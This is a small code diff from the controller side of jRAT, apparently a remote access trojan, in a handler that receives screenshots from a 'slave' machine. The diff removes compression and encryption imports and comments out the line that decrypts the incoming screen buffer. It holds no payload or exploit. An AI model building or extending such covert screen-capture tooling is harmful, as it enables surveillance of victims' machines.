@@ -4,8 +4,6 @@ import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 
 import pro.jrat.Slave;
-import pro.jrat.common.compress.GZip;
-import pro.jrat.common.crypto.Crypto;
 import pro.jrat.ui.frames.FrameQuickRemoteScreen;
 import pro.jrat.utils.ImageUtils;
 
@@ -22,7 +20,7 @@ public class Packet68QuickDesktop extends AbstractIncomingPacket {
 				
 		slave.getDataInputStream().readFully(buffer);
 		
-		buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
+		//buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
 		
 		if (frame != null) {
 			BufferedImage image = ImageUtils.decodeImage(buffer);
